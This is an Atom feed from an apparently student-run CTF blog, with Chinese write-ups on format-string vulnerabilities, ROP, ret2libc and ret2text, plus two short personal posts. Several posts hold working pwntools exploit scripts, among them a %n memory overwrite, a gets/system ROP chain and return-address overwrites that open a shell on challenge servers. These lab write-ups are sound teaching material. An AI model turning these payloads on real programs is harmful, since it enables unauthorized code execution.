<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JiuTian&#39;s blog</title>
  
  <subtitle>曼彻斯特的天空是蓝色的</subtitle>
  <link href="https://jiutian521.github.io/atom.xml" rel="self"/>
  
  <link href="https://jiutian521.github.io/"/>
  <updated>2025-11-08T16:47:51.788Z</updated>
  <id>https://jiutian521.github.io/</id>
  
  <author>
    <name>JiuTian521</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>初识格式化字符串（下）</title>
    <link href="https://jiutian521.github.io/posts/7e846c6a.html"/>
    <id>https://jiutian521.github.io/posts/7e846c6a.html</id>
    <published>2025-11-08T16:00:00.000Z</published>
    <updated>2025-11-08T16:47:51.788Z</updated>
    
    <content type="html"><![CDATA[<p>在上一篇文章中，我们了解了如何利用格式化字符串漏洞实现任意读,主要靠%d，%s等格式化占位符泄露内存。接下来介绍一下如何实现任意写，即覆盖内存</p><h2 id="开挂的-n"><a href="#开挂的-n" class="headerlink" title="开挂的%n"></a>开挂的%n</h2><p>%n是一个很牛的格式化占位符，和%d，%s等占位符不一样,它不输出字符，而是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</p><p>换句话说，它会将已打印的字符个数输出至格式化参数对应的地址中</p><blockquote><p>printf(“包含%n的格式字符串”, …, &amp;变量名);</p></blockquote><p>比较特殊的是，%n对应的参数必须是一个指向整数的指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int count;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Hello, world!%n\n&quot;, &amp;count);</span><br><span class="line">    printf(&quot;上面那行输出了 %d 个字符。\n&quot;, count);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果是：<br>Hello, world!<br>上面那行输出了 13 个字符。</p><p>也就是说%n统计了前面字符串的字符数，并且让count&#x3D;1</p><h2 id="利用-n覆盖内存实战"><a href="#利用-n覆盖内存实战" class="headerlink" title="利用%n覆盖内存实战"></a>利用%n覆盖内存实战</h2><p>主要分以下三个步骤：<br>1.确定覆盖地址<br>2.确定相对偏移<br>3.进行覆盖  </p><p>eg2.ctfshow pwn入门91</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_19-19-22.102l3ea63n.webp"></p><p>logo函数打印了一些欢迎词，不用管。然后是ctfshow函数，下面判断了daniu的值是否等于6，如果是，那么我们就能执行system&#x2F;bin&#x2F;sh。  </p><p>我们进ctfshow函数看一下</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_19-19-44.6m4bh9bgwy.webp"></p><p>首先定义了一个大小为80的数组（缓冲区）s，memset清空重置了s的内容，有一个read函数可以往s里读入数据。重点是下面的printf函数，明显是存在格式化字符串漏洞的，再下面的printf函数可以打印出目前daniu的值</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_19-20-17.2h8q55eau9.webp"></p><p>我们看一下daniu，这里的？就说明其初始值为0，而位于.bss段则是可读可写的</p><p>下面我们的目的就是将daniu的值覆盖为6，覆盖地址确定了，下面我们来求偏移量。什么是偏移量，就是我们利用格式化字符串漏洞写入数据时，我们并不知道是从printf的第几个参数开始写的，我们这里要找到我们是从第几个参数</p><p>有以下两种方法</p><h3 id="手测"><a href="#手测" class="headerlink" title="手测"></a>手测</h3><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_20-09-33.6pnxezpvav.webp"></p><p>aaaa在16进制里是0x61616161，从aaaa往后数的第7个地址是0x61616161，证明我们可以在第7个参数往后读</p><p>这种方法比较无脑，但是存在一个问题是如果限制我们输入%p的数量，那就不好找偏移量了。于是就有了我们的第二个方法</p><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>在pwndbg里有一个叫fmtarg的插件，可以自动帮我们计算偏移量，但是我的虚拟机里没有装这个插件，所以就不演示了，而且我个人更喜欢手测，所以如果以后遇到这种特殊情况再说</p><p>有了覆盖地址和偏移量，我们就可以进行覆盖了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote (&#x27;pwn.challenge.ctf.show&#x27;,28271)</span><br><span class="line">#offset = 7</span><br><span class="line">daniu_addr = 0x0804B038</span><br><span class="line">payload = p32(daniu_addr) + b&#x27;aa%7$n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>我们来逐步理解一下这段payload<br>前面我们提到，%n对应的参数必须是一个指向整数的<strong>指针</strong>,也就是必须是一个<strong>地址</strong></p><p>我们前面已经测试过了，如果我们要通过read去写入字符串，是从栈上的第七个参数开始的写，因此，我们是通过read函数，daniu_addr写到了栈上的第七个参数上</p><p>然后到了第一个printf函数上，printf的第一个参数是s的第一个参数，也就是我们通过read传入的格式化字符串”\x38\xb0\x04\x08 a a %7$n”，我们需要利用的是printf函数里的%7$n这个特性，</p><p>我们可以将%7$n理解为连续7个%n，但是最终起作用的是第7个%n，很显然%7$n需要找printf的第七个参数的地址，这个时候就必须去栈里寻找，前六个参数都是我们之前说的”奇怪的数”，也就是随机从栈上或者寄存器里取的，但是到了栈空间上第七个参数的位置就不一样了，我们通过read函数将daniu_addr写进了栈空间上的第七个参数，那么%7$n就非常开心了，他就会将目标地址锁定为daniu_addr</p><p>让我们把视角拉回printf函数，%7$n前有几个字符呢，我们将daniu_addr打包成了4个字符，加上我们手动输入的两个字符的aa，这一共是6个字符，于是printf函数开始的%7$n开始发力了，它统计到它之前有6个字符，并将数值6赋给了它指向地址对应的参数，也就是让daniu&#x3D;6</p><p>特别容易混淆的是printf的参数和寄存器上的参数，他俩并不是一回事，一定要区分好。printf的一参永远是格式化字符串，read读进去的位置是寄存器的第x个参数的地址，是%x$n所取的地址，这里的x就是我们算的偏移量。</p><p>最后得到flag，靶场迟迟连不上，就先不截图了</p><p>总结一下，格式化字符串漏洞存在的标志比较明显，目前我们初步认识了如何利用%d，%s等读，利用%n写。下一步，格式化字符串还会发挥出什么奇效呢，让我们拭目以待</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在上一篇文章中，我们了解了如何利用格式化字符串漏洞实现任意读,主要靠%d，%s等格式化占位符泄露内存。接下来介绍一下如何实现任意写，即覆盖内存&lt;/p&gt;
&lt;h2 id=&quot;开挂的-n&quot;&gt;&lt;a href=&quot;#开挂的-n&quot; class=&quot;headerlink&quot; title=&quot;开挂的</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="格式化字符串" scheme="https://jiutian521.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>初识格式化字符串（上）</title>
    <link href="https://jiutian521.github.io/posts/c6380b0f.html"/>
    <id>https://jiutian521.github.io/posts/c6380b0f.html</id>
    <published>2025-11-07T16:00:00.000Z</published>
    <updated>2025-11-08T11:52:47.247Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-深入理解格式化字符串"><a href="#1-深入理解格式化字符串" class="headerlink" title="1.深入理解格式化字符串"></a>1.深入理解格式化字符串</h2><p>要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，它的第一个参数是什么，比如<code>printf(&quot;%d %f\n&quot;, x, y);</code>，它的一参是x吗？</p><p>让我们来看看printf的声明，<code>int printf(const char *format, ...)</code>，没错，printf的一参是”%d %f\n”，即格式化字符串，这一点是很多同学都没有意识到的</p><p>我们必须要深刻理解的第二个问题是，什么是格式化字符串</p><blockquote><p>格式化字符串是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的<strong>函数</strong>，它通过用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。我补充一点，这里的转换说明即格式化占位符。</p></blockquote><p>（ps：不要因为长就不读了，反而要读得更仔细，通过学习pwn我认识到，越涉及到一个概念的本质，描述的文字就会越详细）</p><p>通俗的说，它就是包含格式化占位符的字符串</p><h2 id="2-格式化字符串的工作原理"><a href="#2-格式化字符串的工作原理" class="headerlink" title="2.格式化字符串的工作原理"></a>2.格式化字符串的工作原理</h2><p>我们平时使用printf时，格式化占位符是必须和后面的参数一一对应的，有多少个格式化占位符，就必须有多少个参数</p><p>这里必须再说一下printf是如何调用参数的。在64位系统中，我们的参数先会按照一定的顺序被放到6个寄存器里，从第7个参数往后，参数会被放在栈里；32位系统中，参数是直接被放到栈里保存的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %d&quot;,a,b,c);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>在这段程序中，我们的参数先会按顺序被放到栈空间里保存，然后，printf会从栈空间里去找对应的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %d&quot;,a,b);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>而我们去掉了参数c会发生什么呢</p><p>结果会是：1 2 一个很奇怪的数</p><p>因为有第三个%d的存在，printf会试图去栈或寄存器（原本c所在的位置）再取一个整数，但是显然是无法找到c的，于是就会随机地从错误的位置读取内存，就把这个奇怪的数翻了出来。这也侧面证明了printf是从栈里去寻址的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int a=1;</span><br><span class="line">int b=2;</span><br><span class="line">int c=3;</span><br><span class="line">printf(&quot;%d %d %p&quot;,a,b);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>我们把占位符改成%p，输出的结果就是c在栈上的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char a[]</span><br><span class="line">scanf(&quot;%s&quot;,&amp;)</span><br><span class="line">printf(a);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>更极端的情况如上</p><p>因此，我们可以利用格式化字符串实现可读可写</p><p>总结一下：格式化字符串漏洞的产生，就是参数和格式化占位符没有数量上的一一对应，即源代码里的格式化占位符少于参数的数量，于是我们就可以通过输入不同的格式化占位符，去打印栈空间里对应的内容</p><p>eg1：newstar2025 week2 刻在栈上的秘密<br>题目内容：</p><blockquote><p>欢迎来到 x64 位餐厅！服务员 printf 先生有点健忘，他只能记住您菜单上的前 6 道菜 (RDI, RSI, RDX…)，再多就只能堆在摇摇晃晃的餐盘 (栈) 上了。更糟糕的是，他会把你写的菜单原封不动地大声念出来。你能设计一份别有用心的菜单，让他念着念着，就把秘密房间的密码念给你听吗？</p></blockquote><p>这个题没有给我们可执行文件，直接nc链接做即可</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_16-05-19.6ikpjc8t42.webp" alt="题目"></p><p>我们先输入aaaa加几个%p试一下，发现没有看到41414141，这说明aaaa被当成了格式化字符串的一部分被传入了。由于题目简单，我合理推测该prntf函数只有一个参数，即偏移量为0。不过这不重要，正常题目不会这样的</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_16-35-18.54y6fb4kh0.webp"></p><p>下面开始正式做题</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_16-41-25.6ikpjcngqj.webp"></p><p>我们可以看到，第11个%p打印出了密码所在寄存器的地址</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_17-03-18.5c1earqu49.webp"></p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-08_17-03-24.7eh6ytpf5k.webp"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-深入理解格式化字符串&quot;&gt;&lt;a href=&quot;#1-深入理解格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;1.深入理解格式化字符串&quot;&gt;&lt;/a&gt;1.深入理解格式化字符串&lt;/h2&gt;&lt;p&gt;要想理解格式化字符串的原理，我们必须要知道的一个问题是，pr</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="格式化字符串" scheme="https://jiutian521.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
    <link href="https://jiutian521.github.io/posts/d4f00467.html"/>
    <id>https://jiutian521.github.io/posts/d4f00467.html</id>
    <published>2025-11-05T04:00:00.000Z</published>
    <updated>2025-11-06T01:38:37.362Z</updated>
    
    <content type="html"><![CDATA[<p>今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存</p><p>看一下左下角的时间，如果是now那就证明保存了</p><p>另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了</p><p>最后，感谢我磊哥再一次救我</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存&lt;/p&gt;
&lt;p&gt;看一下左下角的时间，如果是now那就证明保存了&lt;/p&gt;
&lt;p&gt;另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以</summary>
      
    
    
    
    <category term="碎碎念" scheme="https://jiutian521.github.io/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
  </entry>
  
  <entry>
    <title>梦开始的地方</title>
    <link href="https://jiutian521.github.io/posts/1234.html"/>
    <id>https://jiutian521.github.io/posts/1234.html</id>
    <published>2025-11-02T10:00:00.000Z</published>
    <updated>2025-11-06T01:38:44.638Z</updated>
    
    <content type="html"><![CDATA[<p>我的博客搭建终于好了！</p><p>从今天起，我会在我的博客上分享我的<strong>wp</strong>，以及一些<strong>CTF的日常</strong>，希望和大家一起多多交流！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我的博客搭建终于好了！&lt;/p&gt;
&lt;p&gt;从今天起，我会在我的博客上分享我的&lt;strong&gt;wp&lt;/strong&gt;，以及一些&lt;strong&gt;CTF的日常&lt;/strong&gt;，希望和大家一起多多交流！&lt;/p&gt;
</summary>
      
    
    
    
    <category term="碎碎念" scheme="https://jiutian521.github.io/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
  </entry>
  
  <entry>
    <title>初识ret2libc</title>
    <link href="https://jiutian521.github.io/posts/b342ee9.html"/>
    <id>https://jiutian521.github.io/posts/b342ee9.html</id>
    <published>2025-11-01T04:30:00.000Z</published>
    <updated>2025-11-06T00:08:26.776Z</updated>
    
    <content type="html"><![CDATA[<p>从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。</p><p>ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处</p><p>egctfshow pwn入门39&amp;41<br>这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh</p><p>首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b583a12117.png" alt="Snipaste_2025-11-05_21-59-53.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b58632beb8.png" alt="Snipaste_2025-11-05_22-00-37.png"></p><p>这段payload首先填充了buf，然后把system地址改到了返回地址，然后把system的ret用四个字节填充了。为什么要填充4个字节呢，我们知道，32位系统传参是用栈传递的，我们用call调用函数时，call会把函数的返回地址压入栈中，函数调用结束后会执行ret指令，回到返回地址处。但我们并不希望system函数返回到某处，因此将返回地址填充上所谓的“虚假地址”，而返回地址往后是system函数的一参，也是我们希望sh在的地方。因此接下来把sh写到system函数的一参，就可以执行shll了</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5886da79b.png" alt="Snipaste_2025-11-05_22-01-12.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。&lt;/p&gt;
&lt;p&gt;ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2libc" scheme="https://jiutian521.github.io/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>初识ROP</title>
    <link href="https://jiutian521.github.io/posts/2b89d936.html"/>
    <id>https://jiutian521.github.io/posts/2b89d936.html</id>
    <published>2025-11-01T04:00:00.000Z</published>
    <updated>2025-11-06T00:08:57.588Z</updated>
    
    <content type="html"><![CDATA[<p>如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。</p><p>何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5571a395c.png" alt="Snipaste_2025-11-05_21-47-57.png"></p><p>出自《深入理解计算机系统（CSAPP）》第三章,要注意的一个问题是，国内外的计算机教材对于栈的画法是相反的，国外的教材更倾向于把栈倒过来画，即栈顶sp在下，栈底bp在上，栈向下增长（向下画）。不过并不影响实际的理解。</p><p>接下来我们需要知道什么是gadget。gadget在英语里的翻译是小玩意，小装置的意思，在二进制领域，gadget就是一小段程序里已经有的，通常以ret结尾的汇编代码，注意这里的关键词，“一小段”，“已有的”，“以ret结尾的”，重点是后两个词，这就意味着我们可以通过一段又一段的gadget不断ret到程序内的不同地方。就算开了NX不让我们执行shellcode，但是程序里已经有的指令总不能不让我们执行吧，这就是gadget的用处。</p><p>所以ROP就是一项通过构造一系列的gadget实现攻击的技术。</p><p>再讲一下got表和plt表是什么，这一块牵扯到静态链接和动态链接，以及延迟绑定相关的内容。延迟绑定我还没有做到涉及的题目，所以暂时按下不表。</p><p>静态链接就是把程序要用的函数，代码等直接写进了可执行文件里，在编译时加载，缺点就是文件的大小会比较大。动态链接会在程序启动时从动态链接库里调用函数，比如libc库。</p><p>PLT表（Procedure Linkage Table，过程链接表），用于支持动态链接函数调用（例如 printf, puts, system等），相当于调用外部函数时的跳板。GOT表 （Global Offset Table全局偏移表）是在运行时保存动态库函数或全局变量实际地址的表。plt表经过一段复杂的过程后，会跳转并链接到got表，这里是存储函数的真实地址，动态链接器负责把libc的地址写进got表，got表会跳转到存放函数的真实地址。</p><p>接下来我以CTFshow的pwn入门43题讲解一下ROP的使用</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b55c3c7f30.png" alt="Snipaste_2025-11-05_21-49-22.png"></p><p>这种情况下我们需要想办法自己构造出一个bin&#x2F;sh出来，我们首先需要知道程序的哪个地方存在可读可写的段。我们gdb程序，在main函数下断点并运行，使用vmmap指令</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b560fedca7.png" alt="Snipaste_2025-11-05_21-50-32.png"></p><p>果然.bss段里有一个buf2的变量，我们可以把bin&#x2F;sh写进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)</span><br><span class="line">io = process(&quot;./pwn43&quot;)</span><br><span class="line">gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420</span><br><span class="line">           break *0x08048450&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">buf2 = 0x0804B060</span><br><span class="line">system = 0x08048450</span><br><span class="line">gets = 0x08048420</span><br><span class="line">payload= b&#x27;A&#x27;*(0x6c+0x4)</span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>来解释一下这段exp：第一步栈溢出，覆盖到EIP处，把EIP指向的返回地址改到gets处，再将gets的返回地址改为system，在调用完gets函数后，会弹出ret指令，ret到system的位置，第一个buf2作为gets的参数，我们的目的是通过gets将bin&#x2F;sh字符写入buf2，（io.sendline(b”&#x2F;bin&#x2F;sh”)就是把bin&#x2F;sh字符串通过gets函数读入buf里），而第二个buf2作为system的一参被调用，最后成功执行system bin&#x2F;sh获得shell</p><p>我们用gdb调试一下，验证这段exp是否正确。</p><p>我们在exp里，在gets函数和system函数处分别下一个断点，运行exp进入gdb调试界面，按c走到第一个断点之前</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5668a58ff.png" alt="Snipaste_2025-11-05_21-52-00.png"></p><p>这里的backtrace窗口简称bt窗口，可以显示当前程序的调用栈，即call stack，每一行都是一个栈帧，可以帮我们看函数调用的顺序</p><p>我们可以看的非常清楚，我们的ebp已经被aaaa覆盖，eip被改到了gets函数处，esp栈顶被改到了system处，在栈窗口，system下方是我们覆盖的两个buf2</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b56db7d3d8.png" alt="Snipaste_2025-11-05_21-53-44.png"></p><p>我们继续按c，执行完gets函数，到system断点前，x&#x2F;s查看一下buf的内存，可以看到bin&#x2F;sh已经被成功写到buf2里了</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b572e8e9ad.png" alt="Snipaste_2025-11-05_21-55-25.png"></p><p>总结一下，本题属于典型的有system无bin&#x2F;sh或sh代替，需要我们自己在一段可读可写的内存里写入bin&#x2F;sh字符串，是非常经典的一道基本ret2libc题目，让我们初步认识了ROP的原理以及是如何构造的，如何找到可读可写的内存，plt表和got表是什么，动态链接和静态链接的过程分别是怎么样的，32位系统是如何通过栈传参的，栈是如何增长的，call和ret指令的本质是怎样的等</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。&lt;/p&gt;
&lt;p&gt;何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&amp;#x2F;</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2libc" scheme="https://jiutian521.github.io/tags/ret2libc/"/>
    
  </entry>
  
  <entry>
    <title>用gdb的动态视角看ret2text的实现</title>
    <link href="https://jiutian521.github.io/posts/2ee84d32.html"/>
    <id>https://jiutian521.github.io/posts/2ee84d32.html</id>
    <published>2025-10-27T10:18:00.000Z</published>
    <updated>2025-11-06T00:09:33.225Z</updated>
    
    <content type="html"><![CDATA[<p>来看一道非常简单的栈溢出</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png" alt="Snipaste_2025-11-05_21-22-13.png"></p><p>后门函数地址ida里很明显，0x8048521</p><p>exp本身不难写,下面看一下怎么用gdb确定偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&quot;./pwn&quot;)</span><br><span class="line">#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);</span><br><span class="line">gdb.attach(io,&quot;b main&quot;) #在main函数下断点</span><br><span class="line">payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b52df75180.png" alt="Snipaste_2025-11-05_21-36-52.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b533859667.png" alt="Snipaste_2025-11-05_21-37-43.png"></p><p>0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）</p><p>用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量</p><p>我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b53386ffa9.png" alt="Snipaste_2025-11-05_21-37-58.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来看一道非常简单的栈溢出&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png&quot; alt=&quot;Snipaste_2025-11-05_21-22-13.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;后门函</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2text" scheme="https://jiutian521.github.io/tags/ret2text/"/>
    
  </entry>
  
  <entry>
    <title>ret2text小tips</title>
    <link href="https://jiutian521.github.io/posts/1111.html"/>
    <id>https://jiutian521.github.io/posts/1111.html</id>
    <published>2025-10-24T04:00:00.000Z</published>
    <updated>2025-11-06T00:08:18.351Z</updated>
    
    <content type="html"><![CDATA[<p>exp模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;39.106.48.123&quot;, 29826)</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*264 + p64(0x401202)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址</p><p>注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;exp模板&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/spa</summary>
      
    
    
    
    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ret2text" scheme="https://jiutian521.github.io/tags/ret2text/"/>
    
  </entry>
  
</feed>
